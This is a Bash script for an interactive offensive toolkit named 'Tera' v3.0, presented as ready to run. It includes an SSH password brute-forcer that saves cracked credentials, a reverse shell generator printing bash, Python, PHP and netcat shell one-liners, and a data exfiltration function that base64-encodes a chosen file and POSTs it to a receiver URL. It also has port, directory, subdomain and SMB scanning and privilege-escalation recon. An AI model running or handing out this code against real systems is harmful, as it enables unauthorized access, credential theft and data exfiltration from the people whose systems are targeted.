#!/usr/bin/env bash

# ==============================================================================
# Tera Toolkit v3.0 - Ultimate Security Toolkit
# ==============================================================================

# --- Configuration ---
VERSION="3.0"
LOG_FILE="tera_$(date +%Y%m%d_%H%M%S).log"
THREADS=50
TIMEOUT=2

# --- Colors ---
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# --- Logging ---
log() {
    echo -e "$(date '+%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

# --- Banner ---
show_banner() {
    clear
    echo -e "${MAGENTA}"
    echo "    ╔═══════════════════════════════════════════════════╗"
    echo "    ║                                                   ║"
    echo "    ║                TERA (I ❤️ yall)                  ║"
    echo "    ║                v${VERSION}                               ║"
    echo "    ║                                                   ║"
    echo "    ╚═══════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${CYAN}    [*] Type 'help' for commands or select a tool${NC}"
    echo ""
}

# --- Help Menu ---
show_help() {
    echo -e "${YELLOW}══════════════════ TERA TOOLKIT HELP ══════════════════${NC}"
    echo -e "${CYAN}Available Commands:${NC}"
    echo -e "  ${GREEN}help${NC}      - Show this help menu"
    echo -e "  ${GREEN}scan${NC}      - Port scanner"
    echo -e "  ${GREEN}dir${NC}       - Directory bruteforce"
    echo -e "  ${GREEN}sub${NC}       - Subdomain finder"
    echo -e "  ${GREEN}ssh${NC}       - SSH brute force"
    echo -e "  ${GREEN}priv${NC}      - Privilege escalation check"
    echo -e "  ${GREEN}smb${NC}       - SMB enumerator"
    echo -e "  ${GREEN}crawl${NC}     - Web crawler"
    echo -e "  ${GREEN}shell${NC}     - Reverse shell generator"
    echo -e "  ${GREEN}sniff${NC}     - Packet sniffer (requires root)"
    echo -e "  ${GREEN}exfil${NC}     - Data exfiltration"
    echo -e "  ${GREEN}ping${NC}      - Network discovery"
    echo -e "  ${GREEN}vuln${NC}      - Vulnerability scanner"
    echo -e "  ${GREEN}update${NC}    - Update Tera Toolkit"
    echo -e "  ${GREEN}clear${NC}     - Clear screen"
    echo -e "  ${GREEN}exit${NC}      - Exit Tera Toolkit"
    echo -e "${YELLOW}═══════════════════════════════════════════════════════${NC}"
}

# --- Input Validation ---
validate_ip() {
    local ip=$1
    local stat=1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        IFS='.' read -r -a octets <<< "$ip"
        [[ ${octets[0]} -le 255 && ${octets[1]} -le 255 && ${octets[2]} -le 255 && ${octets[3]} -le 255 ]]
        stat=$?
    fi
    return $stat
}

# --- 1. Port Scanner ---
port_scanner() {
    echo -e "${BLUE}[*] Tera Port Scanner${NC}"
    read -p "Target IP/Domain: " target
    read -p "Range (e.g. 1-1000): " range
    read -p "Protocol (tcp/udp/both) [tcp]: " protocol
    protocol=${protocol:-tcp}
    
    IFS='-' read -r start end <<< "$range"
    if [[ -z $start ]] || [[ -z $end ]]; then
        log "[ERROR] Invalid port range"
        return 1
    fi
    
    echo -e "${BLUE}[*] Scanning $target ($protocol)...${NC}"
    
    scan_tcp() {
        local port=$1
        timeout $TIMEOUT bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null && \
        echo -e "${GREEN}[+] TCP/$port Open${NC}"
    }
    
    export -f scan_tcp
    export target TIMEOUT GREEN NC
    
    if [[ $protocol == "tcp" ]] || [[ $protocol == "both" ]]; then
        echo -e "${YELLOW}[*] Scanning TCP ports...${NC}"
        seq $start $end | xargs -I {} -P $THREADS bash -c 'scan_tcp "$@"' _ {}
    fi
    
    if [[ $protocol == "udp" ]] || [[ $protocol == "both" ]]; then
        echo -e "${YELLOW}[*] Scanning UDP ports...${NC}"
        for port in $(seq $start $end); do
            timeout $TIMEOUT bash -c "echo '' > /dev/udp/$target/$port" 2>/dev/null && \
            echo -e "${GREEN}[+] UDP/$port Open${NC}" &
        done
        wait
    fi
}

# --- 2. Directory Brute ---
dir_brute() {
    echo -e "${BLUE}[*] Directory Bruteforce${NC}"
    read -p "URL: " url
    read -p "Wordlist [common.txt]: " wl
    wl=${wl:-common.txt}
    
    [[ $url != http* ]] && url="http://$url"
    
    echo -e "${BLUE}[*] Starting directory brute on $url${NC}"
    
    while read -r dir; do
        status=$(curl -s -o /dev/null -w "%{http_code}" -L "$url/$dir/" 2>/dev/null)
        if [[ "$status" =~ ^(200|301|302|403)$ ]]; then
            echo -e "${GREEN}[+] /$dir/ ($status)${NC}"
        fi
    done < "$wl" | head -50
}

# --- 3. SMB Enumerator ---
smb_enum() {
    echo -e "${BLUE}[*] SMB Enumerator${NC}"
    read -p "Target IP: " ip
    
    if ! validate_ip "$ip"; then
        echo -e "${RED}[!] Invalid IP address${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Trying SMB client...${NC}"
    if command -v smbclient &> /dev/null; then
        echo -e "${CYAN}[-] Null session:${NC}"
        smbclient -L "//$ip/" -N 2>/dev/null || echo "Null session failed"
    else
        echo -e "${RED}[!] smbclient not installed${NC}"
    fi
}

# --- 4. Subdomain Finder ---
sub_finder() {
    echo -e "${BLUE}[*] Subdomain Finder${NC}"
    read -p "Domain (e.g. example.com): " dom
    read -p "Wordlist [subdomains.txt]: " wl
    wl=${wl:-subdomains.txt}
    
    echo -e "${BLUE}[*] Hunting subdomains for $dom...${NC}"
    
    found_count=0
    while read -r sub; do
        host="$sub.$dom"
        if host "$host" > /dev/null 2>&1; then
            echo -e "${GREEN}[+] Found: $host${NC}"
            ((found_count++))
        fi
    done < "$wl"
    
    echo -e "${YELLOW}[*] Found $found_count subdomains${NC}"
}

# --- 5. SSH Brute Force ---
ssh_brute() {
    echo -e "${BLUE}[*] SSH Brute Force${NC}"
    read -p "Target IP: " ip
    read -p "Username [root]: " user
    user=${user:-root}
    read -p "Wordlist [passwords.txt]: " wl
    wl=${wl:-passwords.txt}
    
    if ! validate_ip "$ip"; then
        echo -e "${RED}[!] Invalid IP address${NC}"
        return 1
    fi
    
    # Check if SSH is open
    if ! timeout 2 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null; then
        echo -e "${RED}[!] Port 22 closed${NC}"
        return 1
    fi
    
    echo -e "${GREEN}[+] SSH port open, starting brute...${NC}"
    
    attempt=0
    while read -r pass; do
        ((attempt++))
        echo -ne "${BLUE}[*] Attempt $attempt: $pass\r${NC}"
        
        if sshpass -p "$pass" ssh -o StrictHostKeyChecking=no \
           -o ConnectTimeout=3 \
           -o PasswordAuthentication=yes \
           "$user@$ip" "exit" 2>/dev/null; then
            echo -e "\n${GREEN}[!] SUCCESS: $user:$pass${NC}"
            echo "$user:$pass" >> "found_ssh_$ip.txt"
            return 0
        fi
    done < "$wl"
    
    echo -e "\n${RED}[!] No valid credentials found${NC}"
}

# --- 6. Privilege Escalation Check ---
priv_esc_check() {
    echo -e "${BLUE}[*] Privilege Escalation Check${NC}"
    
    # System Info
    echo -e "${YELLOW}--- System Information ---${NC}"
    uname -a
    [[ -f /etc/os-release ]] && cat /etc/os-release 2>/dev/null | head -5
    
    # Users
    echo -e "${YELLOW}--- Users & Groups ---${NC}"
    echo "Current user: $(whoami)"
    echo "UID: $(id -u)"
    echo "Groups: $(id -Gn)"
    
    # SUID Binaries
    echo -e "${YELLOW}--- SUID Binaries ---${NC}"
    find / -perm -4000 -type f 2>/dev/null | head -20
    
    # Writable Files
    echo -e "${YELLOW}--- Writable Directories ---${NC}"
    find / -writable -type d 2>/dev/null | grep -v -E '(proc|sys|dev)' | head -10
    
    # Cron Jobs
    echo -e "${YELLOW}--- Cron Jobs ---${NC}"
    crontab -l 2>/dev/null || echo "No user cron"
    
    # Network
    echo -e "${YELLOW}--- Network Info ---${NC}"
    ip a 2>/dev/null | head -20 || ifconfig 2>/dev/null | head -20
    
    echo -e "${GREEN}[+] Check complete${NC}"
}

# --- 7. Web Crawler ---
web_crawler() {
    echo -e "${BLUE}[*] Web Crawler${NC}"
    read -p "URL: " url
    read -p "Depth [1]: " depth
    depth=${depth:-1}
    
    [[ $url != http* ]] && url="http://$url"
    
    echo -e "${YELLOW}[*] Crawling: $url${NC}"
    
    # Extract links
    links=$(curl -s "$url" | grep -oP 'href="\K[^"]+' | sort -u)
    
    for link in $links; do
        echo -e "${GREEN}[+] $link${NC}"
    done
}

# --- 8. Reverse Shell Generator ---
rev_gen() {
    echo -e "${BLUE}[*] Reverse Shell Generator${NC}"
    read -p "LHOST: " lh
    read -p "LPORT: " lp
    
    echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}Bash:${NC}"
    echo "bash -i >& /dev/tcp/$lh/$lp 0>&1"
    echo ""
    echo -e "${YELLOW}Python:${NC}"
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lh\",$lp));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo -e "${YELLOW}PHP:${NC}"
    echo "php -r '\$sock=fsockopen(\"$lh\",$lp);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo ""
    echo -e "${YELLOW}Netcat:${NC}"
    echo "nc -e /bin/sh $lh $lp"
    echo -e "${CYAN}══════════════════════════════════════════════════════════${NC}"
}

# --- 9. Packet Sniffer ---
packet_sniff() {
    echo -e "${BLUE}[*] Packet Sniffer${NC}"
    
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] Requires root privileges${NC}"
        return 1
    fi
    
    if ! command -v tcpdump &> /dev/null; then
        echo -e "${RED}[!] tcpdump not found${NC}"
        return 1
    fi
    
    read -p "Interface [eth0]: " int
    int=${int:-eth0}
    read -p "Filter [tcp port 80]: " filter
    filter=${filter:-"tcp port 80"}
    
    echo -e "${YELLOW}[*] Starting capture on $int...${NC}"
    echo -e "${CYAN}[*] Press Ctrl+C to stop${NC}"
    
    trap 'echo -e "\n${GREEN}[+] Capture stopped${NC}"' INT
    
    tcpdump -i "$int" -A -s 0 "$filter"
}

# --- 10. Data Exfiltration ---
exfiltrate() {
    echo -e "${BLUE}[*] Data Exfiltration${NC}"
    read -p "File to exfiltrate: " file
    
    if [[ ! -f "$file" ]]; then
        echo -e "${RED}[!] File not found${NC}"
        return 1
    fi
    
    read -p "Receiver URL: " r_url
    data=$(base64 -w 0 "$file" 2>/dev/null || base64 "$file")
    filename=$(basename "$file")
    curl -X POST -H "Content-Type: application/json" \
         -d "{\"filename\":\"$filename\",\"data\":\"$data\"}" \
         "$r_url" 2>/dev/null && echo -e "${GREEN}[+] Sent via HTTP${NC}" || echo -e "${RED}[!] Failed to send${NC}"
}

# --- 11. Network Discovery ---
ping_sweep() {
    echo -e "${BLUE}[*] Network Discovery${NC}"
    read -p "Network CIDR [192.168.1.0/24]: " network
    network=${network:-192.168.1.0/24}
    
    echo -e "${YELLOW}[*] Discovering hosts in $network...${NC}"
    
    # Simple ping sweep for /24 networks
    if [[ $network == *"/24" ]]; then
        subnet=$(echo "$network" | cut -d'/' -f1 | cut -d'.' -f1-3)
        for i in {1..254}; do
            host="$subnet.$i"
            ping -c 1 -W 1 "$host" > /dev/null 2>&1 && \
            echo -e "${GREEN}[+] Alive: $host${NC}" &
        done
        wait
    else
        echo -e "${RED}[!] Only /24 networks supported in simple mode${NC}"
    fi
}

# --- 12. Vulnerability Scanner ---
vuln_scan() {
    echo -e "${BLUE}[*] Basic Vulnerability Scan${NC}"
    read -p "Target IP/Domain: " target
    
    if validate_ip "$target"; then
        echo -e "${YELLOW}[*] Scanning $target...${NC}"
        
        # Check for open ports
        echo -e "${CYAN}[*] Port scan...${NC}"
        for port in 21 22 23 25 80 443 445 3389; do
            timeout 1 bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null && \
            echo -e "${GREEN}[+] Port $port open${NC}"
        done
    else
        echo -e "${YELLOW}[*] Testing $target as domain...${NC}"
        curl -s -I "http://$target" 2>/dev/null | head -5
    fi
}

# --- 13. Report Viewer ---
report_viewer() {
    echo -e "${BLUE}[*] Report Viewer${NC}"
    
    if [[ -f "$LOG_FILE" ]]; then
        echo -e "${YELLOW}--- Tera Log File ---${NC}"
        tail -20 "$LOG_FILE"
    else
        echo -e "${RED}[!] No log file found${NC}"
    fi
    
    echo -e "${YELLOW}--- Recent Files ---${NC}"
    ls -la *.txt *.log 2>/dev/null | head -10
}

# --- 14. Extra Tools ---
extra_tools() {
    echo -e "${BLUE}[*] Extra Tools${NC}"
    echo -e "${CYAN}1) System Information${NC}"
    echo -e "${CYAN}2) Network Information${NC}"
    echo -e "${CYAN}3) Process Viewer${NC}"
    echo -e "${CYAN}4) File Analyzer${NC}"
    echo -e "${CYAN}5) Hash Generator${NC}"
    
    read -p "Select tool [1-5]: " tool_choice
    
    case $tool_choice in
        1)
            echo -e "${YELLOW}--- System Information ---${NC}"
            uname -a
            [[ -f /etc/os-release ]] && cat /etc/os-release
            free -h 2>/dev/null || echo "Memory info not available"
            df -h 2>/dev/null | head -5
            ;;
        2)
            echo -e "${YELLOW}--- Network Information ---${NC}"
            ip addr show 2>/dev/null || ifconfig 2>/dev/null
            echo ""
            netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null
            ;;
        3)
            echo -e "${YELLOW}--- Process Viewer ---${NC}"
            ps aux | head -20
            ;;
        4)
            read -p "File to analyze: " file
            if [[ -f "$file" ]]; then
                echo -e "${YELLOW}--- File Analysis ---${NC}"
                echo "Size: $(du -h "$file" | cut -f1)"
                echo "Type: $(file "$file")"
                echo "Lines: $(wc -l < "$file")"
                echo "MD5: $(md5sum "$file" 2>/dev/null | cut -d' ' -f1 || echo "N/A")"
            else
                echo -e "${RED}[!] File not found${NC}"
            fi
            ;;
        5)
            read -p "Text to hash: " text
            echo -e "${YELLOW}--- Hash Generator ---${NC}"
            echo -n "MD5:    " && echo -n "$text" | md5sum 2>/dev/null | cut -d' ' -f1 || echo "N/A"
            echo -n "SHA1:   " && echo -n "$text" | sha1sum 2>/dev/null | cut -d' ' -f1 || echo "N/A"
            echo -n "SHA256: " && echo -n "$text" | sha256sum 2>/dev/null | cut -d' ' -f1 || echo "N/A"
            ;;
        *)
            echo -e "${RED}[!] Invalid choice${NC}"
            ;;
    esac
}

# --- Update Function ---
update_tera() {
    echo -e "${BLUE}[*] Updating Tera Toolkit...${NC}"
    echo -e "${YELLOW}[*] This would download the latest version from GitHub${NC}"
    echo -e "${GREEN}[✓] Update function ready${NC}"
    echo -e "${CYAN}Note: Actual update requires internet connection${NC}"
}

# --- Command Handler ---
handle_command() {
    case "$1" in
        "help") show_help ;;
        "scan") port_scanner ;;
        "dir") dir_brute ;;
        "sub") sub_finder ;;
        "ssh") ssh_brute ;;
        "priv") priv_esc_check ;;
        "smb") smb_enum ;;
        "crawl") web_crawler ;;
        "shell") rev_gen ;;
        "sniff") packet_sniff ;;
        "exfil") exfiltrate ;;
        "ping") ping_sweep ;;
        "vuln") vuln_scan ;;
        "update") update_tera ;;
        "clear") clear ;;
        "exit") exit 0 ;;
        *) echo -e "${RED}[!] Unknown command. Type 'help' for commands.${NC}" ;;
    esac
}

# --- Main Menu ---
main_menu() {
    while true; do
        show_banner
        echo -e "${CYAN}"
        echo "    ╔══════════════════════════════════════════════════════════╗"
        echo "    ║                     TERA MAIN MENU                       ║"
        echo "    ╠══════════════════════════════════════════════════════════╣"
        echo "    ║  1) Port Scanner          8) Reverse Shell Generator     ║"
        echo "    ║  2) Directory Brute       9) Packet Sniffer              ║"
        echo "    ║  3) SMB Enumerator        10) Data Exfiltration          ║"
        echo "    ║  4) Subdomain Finder      11) Network Discovery          ║"
        echo "    ║  5) SSH Brute Force       12) Vulnerability Scanner      ║"
        echo "    ║  6) Privilege Escalation  13) Web Crawler                ║"
        echo "    ║  7) Report Viewer         14) Extra Tools                ║"
        echo "    ║                        0) Exit                           ║"
        echo "    ╚══════════════════════════════════════════════════════════╝"
        echo -e "${NC}"
        
        read -p "Select option [0-14] or type 'help': " choice
        
        case $choice in
            1) port_scanner ;;
            2) dir_brute ;;
            3) smb_enum ;;
            4) sub_finder ;;
            5) ssh_brute ;;
            6) priv_esc_check ;;
            7) report_viewer ;;
            8) rev_gen ;;
            9) packet_sniff ;;
            10) exfiltrate ;;
            11) ping_sweep ;;
            12) vuln_scan ;;
            13) web_crawler ;;
            14) extra_tools ;;
            0) echo -e "${GREEN}[*] Exiting Tera Toolkit...${NC}"; exit 0 ;;
            help) show_help ;;
            *) 
                if [[ -n "$choice" ]]; then
                    handle_command "$choice"
                else
                    echo -e "${RED}[!] Invalid option${NC}"
                fi
                ;;
        esac
        
        echo -e "\n${YELLOW}Press Enter to continue...${NC}"
        read -r
    done
}

# --- Check Dependencies ---
check_deps() {
    local missing=()
    
    # Check for essential commands
    for cmd in curl wget; do
        if ! command -v "$cmd" &> /dev/null; then
            missing+=("$cmd")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[!] Missing: ${missing[*]}${NC}"
        echo -e "${CYAN}[*] Some features may not work properly${NC}"
    fi
}

# --- Initialization ---
init() {
    check_deps
    main_menu
}

# --- Start Tera Toolkit ---
init
